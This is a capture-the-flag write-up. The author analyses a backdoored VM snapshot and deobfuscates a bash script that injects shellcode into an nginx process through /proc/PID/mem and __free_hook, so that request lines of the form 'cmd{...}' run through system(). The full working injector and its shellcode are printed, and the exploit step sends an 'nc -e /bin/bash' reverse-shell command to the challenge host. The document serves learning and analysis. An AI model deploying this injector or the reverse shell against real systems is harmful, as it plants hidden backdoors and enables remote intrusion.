# identification

For this one, we are given a hostname to retrieve the flag and a tarball containing `art_ctf_injector_local.qcow2`, a `qemu` image with a snapshot:

```console
$ qemu-img info art_ctf_injector_local.qcow2
image: art_ctf_injector_local.qcow2
file format: qcow2
virtual size: 10 GiB (10737418240 bytes)
disk size: 2.78 GiB
cluster_size: 65536
Snapshot list:
ID        TAG                     VM SIZE                DATE       VM CLOCK
1         compromised             452 MiB 2021-01-13 20:15:55   00:02:17.632
Format specific information:
    compat: 1.1
    compression type: zlib
    lazy refcounts: false
    refcount bits: 16
    corrupt: false
```

And the script to run it:
```console
#!/bin/sh

IMAGE=art_ctf_injector_local.qcow2
SNAPSHOT=compromised

stty intr ^]

echo "Restoring snapshot $SNAPSHOT ($IMAGE)"
echo "Press Return..."

qemu-system-x86_64 -enable-kvm -machine pc-i440fx-4.2 -nodefaults -nographic \
	-chardev stdio,id=c1 -monitor tcp:127.0.0.1:55555,server,nowait \
	--device isa-serial,chardev=c1 -m size=512M,maxmem=512M \
	-netdev user,id=n1,net=192.168.76.0/24,dhcpstart=192.168.76.9,hostfwd=tcp::3322-:3322,hostfwd=tcp::4321-:4321 \
	-device virtio-net,netdev=n1 -object rng-random,filename=/dev/urandom,id=rng0 \
	-device virtio-rng-pci,rng=rng0 -boot order=c -hda $IMAGE -loadvm $SNAPSHOT

stty intr
```

Given that we have the full command line to instanciate this virtual machine with its snapshot, it looks like this is not a disk forensics challenge but we will have to investigate from the image itself.

From the description, we know that an employee backdoored the server. As such, we are looking for a remote service to connect back to the host.

# analysis

## run script

I first tried to instanciate the VM on a Ubuntu 20.04 VM (with VTd passed through but it didn't worked). Looking at the errors I saw posts related to versions mismatch. Having a second look at the challenge description, I saw the hint specifying working version. I was able to start it from a Kali Linux 2020.04 VM.

From the `qemu` command line, we can spot that two ports are exposed to the host. Those are potential services for the backdoor :)

## virtual machine

Looking at the listening processes, we find the ports from the `qemu` command line, linked to `sshd` and `nginx`. I first enumerated common Linux persistence mechanisms such as crontab, `.profile`, `.bash_rc`, services, ... without any luck. Even `.bash_history` is empty...

```console
$ sudo ./run.sh
Restoring snapshot compromised (art_ctf_injector_local.qcow2)
Press Return...
qemu-system-x86_64: warning: TSC frequency mismatch between VM (2400004 kHz) and host (2304003 kHz), and TSC scaling unavailable

root@injector-local:~# netstat -tulpen
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        20530      363/systemd-resolve
tcp        0      0 0.0.0.0:3322            0.0.0.0:*               LISTEN      0          21317      377/sshd: /usr/sbin
tcp        0      0 0.0.0.0:4321            0.0.0.0:*               LISTEN      0          21331      379/nginx: master p
tcp6       0      0 :::3322                 :::*                    LISTEN      0          21328      377/sshd: /usr/sbin
udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        20529      363/systemd-resolve
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          23257      591/dhclient
```

Looking at the `enabled-modules` and `enabled-sites` for `nginx` didn't brought anything suspicious either. All libraries were last modified at the same date. This could have been an injection point, just like `ld_preload` which could be used to backdoor Linux processes.

After some time lost looking around, I thought "ok, if you have a library to backdoor something, you would probably need to compile it locally and you would store the source under...":

```console
root@injector-local:~# ll -a /tmp/
total 44
[...]
drwxrwxrwt  2 root root 4096 Jan 13 19:13 .font-unix/
drwxr-xr-x  2 root root 4096 Jan 13 19:15 .hax/
drwxrwxrwt  2 root root 4096 Jan 13 19:13 .ICE-unix/
[...]
root@injector-local:~# cat /tmp/.hax/injector.sh
#!/bin/bash

set -e

roth8Kai() {
	for i in $(seq 0 7); do
		curr=$(($1 >> $i*8 & 0xff))
		packed="$packed$(printf '\\x%02x' $curr)"
	done

	echo $packed
}

ieph2Oon() {
    echo $((0x$(nm -D "$1" | sed 's/@.*//' | grep -E " $2$" | cut -d ' ' -f1)))
}

QueSh8yi() {
    echo -ne "$3" | dd of="/proc/$1/mem" bs=1 "seek=$2" conv=notrunc 2>/dev/null
}

ojeequ9I() {
    code="$1"
    from=$(echo "$2" | sed 's/\\/\\\\/g')
    to=$(echo $3 | sed 's/\\/\\\\/g')

    echo $code | sed "s/$from/$to/g"
}

xeiCh4xi() {
    echo "$1" | base64 -d | gzip -d
}

ia5Uuboh() {
    go7uH1yu="$1"

    ih9Ea1se=$(grep -E "/libc.*so$" "/proc/$go7uH1yu/maps" | head -n 1 | tr -s ' ')
    Teixoo1Z=$((0x$(cut -d '-' -f1 <<< "$ih9Ea1se")))
    cu1eiSe9=$(cut -d ' ' -f6 <<< "$ih9Ea1se")
    eo0oMaeL=$((Teixoo1Z+$(ieph2Oon $cu1eiSe9 $(xeiCh4xi H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA==))))
    de0fie1O=$((Teixoo1Z+$(ieph2Oon $cu1eiSe9 $(xeiCh4xi H4sIAAAAAAAAAyuuLC5JzQUAixFNyQYAAAA=))))
    EeGie9qu=$((Teixoo1Z+$(ieph2Oon $cu1eiSe9 $(xeiCh4xi H4sIAAAAAAAAA0srSk0FAMjBLk0EAAAA))))
    Eeko2juZ=$((Teixoo1Z+$(ieph2Oon $cu1eiSe9 $(xeiCh4xi H4sIAAAAAAAAA8tNzMnJT44vLU5MykmNL86sSgUA3kc6ChIAAAA=))))
    Iek6Joyo=$((0x$(grep -E "/libc.*so$" "/proc/$go7uH1yu/maps" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2)))

    HeiSuC5o='\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\x41\x55\x49\xbd\x43\x43\x43\x43\x43\x43\x43\x43\x41\x54\x49\x89\xfc\x55\x53\x4c\x89\xe3\x52\xff\xd0\x48\x89\xc5\x48\xb8\x44\x44\x44\x44\x44\x44\x44\x44\x48\xc7\x00\x00\x00\x00\x00\x48\x83\xfd\x05\x76\x61\x80\x3b\x63\x75\x54\x80\x7b\x01\x6d\x75\x4e\x80\x7b\x02\x64\x75\x48\x80\x7b\x03\x7b\x75\x42\xc6\x03\x00\x48\x8d\x7b\x04\x48\x8d\x55\xfc\x48\x89\xf8\x8a\x08\x48\x89\xc3\x48\x89\xd5\x48\x8d\x40\x01\x48\x8d\x52\xff\x8d\x71\xe0\x40\x80\xfe\x5e\x77\x1b\x80\xf9\x7d\x75\x08\xc6\x03\x00\x41\xff\xd5\xeb\x0e\x48\x83\xfa\x01\x75\xd4\xbd\x01\x00\x00\x00\x48\x89\xc3\x48\xff\xc3\x48\xff\xcd\xeb\x99\x48\xb8\x42\x42\x42\x42\x42\x42\x42\x42\x4c\x89\xe7\xff\xd0\x48\xb8\x55\x55\x55\x55\x55\x55\x55\x55\x48\xa3\x44\x44\x44\x44\x44\x44\x44\x44\x58\x5b\x5d\x41\x5c\x41\x5d\xc3'
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x41\x41\x41\x41\x41\x41\x41\x41' $(roth8Kai $Eeko2juZ))
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x42\x42\x42\x42\x42\x42\x42\x42' $(roth8Kai $EeGie9qu))
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x43\x43\x43\x43\x43\x43\x43\x43' $(roth8Kai $de0fie1O))
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x44\x44\x44\x44\x44\x44\x44\x44' $(roth8Kai $eo0oMaeL))
    Que2vah0=$(echo -ne $HeiSuC5o | wc -c)
    Thee6ahB=$(($Iek6Joyo - $Que2vah0))
    HeiSuC5o=$(ojeequ9I $HeiSuC5o '\x55\x55\x55\x55\x55\x55\x55\x55' $(roth8Kai $Thee6ahB))

    QueSh8yi $go7uH1yu $Thee6ahB $HeiSuC5o
    QueSh8yi $go7uH1yu $eo0oMaeL $(roth8Kai $Thee6ahB)
}

if [ $# -ne 1  ] || [ ! -e "/proc/$1" ] ; then
    exit 42
fi

ia5Uuboh $1
```

Turns out this is not a library but a shell script! We can quickly identify that `HeiSuC5o` is the injected payload and the injection is probably made using `dd` and `/proc/$1/mem` in `QueSh8yi()`

## script

Analyzing the script, we come up with this deobfuscated version:

```shell
#!/bin/bash

set -e

pack() {
        for i in $(seq 0 7); do
                curr=$(($1 >> $i*8 & 0xff))
                packed="$packed$(printf '\\x%02x' $curr)"
        done

        echo $packed
}

get_function_offset() {
    echo $((0x$(nm -D "$1" | sed 's/@.*//' | grep -E " $2$" | cut -d ' ' -f1)))
root@injector-local:/tmp/.hax# cat injector.sh
#!/bin/bash

set -e

pack() {
	for i in $(seq 0 7); do
		curr=$(($1 >> $i*8 & 0xff))
		packed="$packed$(printf '\\x%02x' $curr)"
	done

	echo $packed
}

get_function_offset() {
    echo $((0x$(nm -D "$1" | sed 's/@.*//' | grep -E " $2$" | cut -d ' ' -f1)))
}

inject_payload() {
    echo -ne "$3" | dd of="/proc/$1/mem" bs=1 "seek=$2" conv=notrunc 2>/dev/null
}

replace_addr() {
    code="$1"
    from=$(echo "$2" | sed 's/\\/\\\\/g')
    to=$(echo $3 | sed 's/\\/\\\\/g')

    echo $code | sed "s/$from/$to/g"
}

d64_gzip() {
    echo "$1" | base64 -d | gzip -d
}

inject() {
    target_pid="$1"

    libc_map_in_target=$(grep -E "/libc.*so$" "/proc/$target_pid/maps" | head -n 1 | tr -s ' ')
    libc_start=$((0x$(cut -d '-' -f1 <<< "$libc_map_in_target")))
    libc_path=$(cut -d ' ' -f6 <<< "$libc_map_in_target")
    __free_hook_offset=$((libc_start+$(get_function_offset $libc_path __free_hook)))
    system_offset=$((libc_start+$(get_function_offset $libc_path system)))
    free_offset=$((libc_start+$(get_function_offset $libc_path free)))
    malloc_usable_size_offset=$((libc_start+$(get_function_offset $libc_path malloc_usable_size)))
    libc_exec_end=$((0x$(grep -E "/libc.*so$" "/proc/$target_pid/maps" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2)))

    payload='\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\x41\x55\x49\xbd\x43\x43\x43\x43\x43\x43\x43\x43\x41\x54\x49\x89\xfc\x55\x53\x4c\x89\xe3\x52\xff\xd0\x48\x89\xc5\x48\xb8\x44\x44\x44\x44\x44\x44\x44\x44\x48\xc7\x00\x00\x00\x00\x00\x48\x83\xfd\x05\x76\x61\x80\x3b\x63\x75\x54\x80\x7b\x01\x6d\x75\x4e\x80\x7b\x02\x64\x75\x48\x80\x7b\x03\x7b\x75\x42\xc6\x03\x00\x48\x8d\x7b\x04\x48\x8d\x55\xfc\x48\x89\xf8\x8a\x08\x48\x89\xc3\x48\x89\xd5\x48\x8d\x40\x01\x48\x8d\x52\xff\x8d\x71\xe0\x40\x80\xfe\x5e\x77\x1b\x80\xf9\x7d\x75\x08\xc6\x03\x00\x41\xff\xd5\xeb\x0e\x48\x83\xfa\x01\x75\xd4\xbd\x01\x00\x00\x00\x48\x89\xc3\x48\xff\xc3\x48\xff\xcd\xeb\x99\x48\xb8\x42\x42\x42\x42\x42\x42\x42\x42\x4c\x89\xe7\xff\xd0\x48\xb8\x55\x55\x55\x55\x55\x55\x55\x55\x48\xa3\x44\x44\x44\x44\x44\x44\x44\x44\x58\x5b\x5d\x41\x5c\x41\x5d\xc3'
    payload=$(replace_addr $payload '\x41\x41\x41\x41\x41\x41\x41\x41' $(pack $malloc_usable_size_offset))
    payload=$(replace_addr $payload '\x42\x42\x42\x42\x42\x42\x42\x42' $(pack $free_offset))
    payload=$(replace_addr $payload '\x43\x43\x43\x43\x43\x43\x43\x43' $(pack $system_offset))
    payload=$(replace_addr $payload '\x44\x44\x44\x44\x44\x44\x44\x44' $(pack $__free_hook_offset))
    payload_len=$(echo -ne $payload | wc -c)
    inject_addr=$(($libc_exec_end - $payload_len))
    payload=$(replace_addr $payload '\x55\x55\x55\x55\x55\x55\x55\x55' $(pack $inject_addr))

    inject_payload $target_pid $inject_addr $payload
    inject_payload $target_pid $__free_hook_offset $(pack $inject_addr)
}

if [ $# -ne 1  ] || [ ! -e "/proc/$1" ] ; then
    exit 42
fi

inject $1
```

We now know the following:
- injection is performed by writing in `/proc/$1/mem`
- a code cave is found is a segment with write and execution rights
- injection is performed by setting `__free_hook` to the shellcode injection address
- `system()` will be called with something as an argument

`__free_hook` is defined [here](https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html) as "The value of this variable is a pointer to function that free uses whenever it is called"

We can load the shellcode in a disassembler like Binary Ninja and rename the symbols (`\x41\x41\x41\x41\x41\x41\x41\x41`, ...) to the functions they refer to (see calls to the `replace_addr` function in the script). Using the HLIL view, we end-up with the following code.

```c
0001001d  char* rbx = arg1
00010021  int64_t rax
00010021  int64_t rcx
00010021  rax, rcx = malloc_usable_size()
00010023  int64_t rbp = rax
00010030  *__free_hook = 0
0001003b  for (; rbp u> 5; rbp = rbp - 1)
0001004e      if (*rbx == 0x63 && (*(rbx + 1) == 0x6d && (*(rbx + 2) == 0x64 && *(rbx + 3) == 0x7b)))
00010054          *rbx = 0
00010057          void* rdi = rbx + 4
0001005b          int64_t rdx = rbp - 4
0001005f          void* rax_1 = rdi
00010062          while (true)
00010062              rcx.b = *rax_1
00010064              rbx = rax_1
00010067              rbp = rdx
0001006a              rax_1 = rax_1 + 1
0001006e              rdx = rdx - 1
00010072              uint64_t rsi = zx.q((rcx - 0x20).d)
00010079              if (rsi.b u> 0x5e)
00010079                  break
00010080              if (rcx.b == 0x7d)
00010080                  *rbx = 0
00010083                  system(rdi, rsi, rdx, rcx)
00010086                  break
0001008e              if (rdx == 1)
0001008e                  rbp = 1
00010093                  rbx = rax_1
00010093                  break
00010096      rbx = rbx + 1
000100ab  free(arg1)
000100b7  *__free_hook = 0x5555555555555555
000100c8  return arg3
```

This indicates us that the first argument of the hook (in `rdi`) should point to a string starting with `cmd{` and that everything until a `}` is passed to `system()`.

Let's check using `gdb` if we can spot the shellcode at `__free_hook` address in either `nginx` or `sshd`:

```console
root@injector-local:~# ps aux | grep nginx
root         379  0.0  0.3  58096  1524 ?        Ss   19:13   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data     380  0.0  1.0  58692  5228 ?        S    19:13   0:00 nginx: worker process
root        1325  8.0  0.1   6284   932 ttyS0    S+   19:16   0:00 grep --color=auto nginx
root@injector-local:~# gdb -p 380
(gdb) print __free_hook
$3 = (void (*)(void *, const void *)) 0x7f0cd6ac7f37
(gdb) x /10i 0x7f0cd6ac7f37
   0x7f0cd6ac7f37:	movabs $0x7f0cd69ce260,%rax <-- shellcode beginning
   0x7f0cd6ac7f41:	push   %r13
   0x7f0cd6ac7f43:	movabs $0x7f0cd69853c0,%r13
   0x7f0cd6ac7f4d:	push   %r12
   0x7f0cd6ac7f4f:	mov    %rdi,%r12
```

Got it! Let's validate where `rdi` points to. The breakpoint is hit several times here since `free()` is called often :)

```console
(gdb) b *0x7f0cd6ac7f37
Breakpoint 1 at 0x7f0cd6ac7f37
(gdb) c
Continuing.
[...]
```

And in another console:

```console
nc localhost 4321
GET /
```

This leads us to this interrupt:

```console
Breakpoint 1, 0x00007f0cd6ac7f37 in ?? ()
(gdb) x /s $rdi
0x562ca84b1d20:	"GET /\n"
```

# exploitation

We now know that this corresponds to the line of our request, starting where the HTTP verb should be. Next, trying the exploit on the VM and on the real target:

```console
$ nc injector.challenges.adversary.zone 4321
cmd{nc -e /bin/bash ctfbox 4444}
cat flag.txt
[...]
```

Really enjoyed this one from a scenario point of view, well made!